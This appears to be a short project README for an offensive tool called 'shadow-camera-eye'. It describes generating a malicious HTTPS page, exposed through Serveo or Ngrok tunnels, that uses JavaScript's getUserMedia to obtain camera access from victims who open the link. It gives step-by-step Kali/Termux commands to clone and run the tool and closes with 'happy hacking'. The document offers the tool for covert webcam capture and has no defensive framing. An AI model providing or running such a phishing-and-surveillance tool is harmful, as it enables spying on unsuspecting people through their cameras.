

# How it works?
<p>The tool generates a malicious HTTPS page using Serveo or Ngrok Port Forwarding methods, and a javascript code to cam requests using MediaDevices.getUserMedia. </p>

<p>The MediaDevices.getUserMedia() method prompts the user for permission to use a media input which produces a MediaStream with tracks containing the requested types of media. That stream can include, for example, a video track (produced by either a hardware or virtual video source such as a camera, video recording device, screen sharing service, and so forth), an audio track (similarly, produced by a physical or virtual audio source like a microphone, A/D converter, or the like), and possibly other track types. </p>

## Installing (Kali Linux/Termux):


```
$ apt update && apt upgrade

$ apt install git php wget curl jq

$ git clone https://github.com/MNK-hub/shadow-camera-eye

$ cd shadow-camera-eye

$ chmod +x shadow-camera-eye.sh

$ bash shadow-camera-eye.sh
```

<b>happy hacking : ]<b>
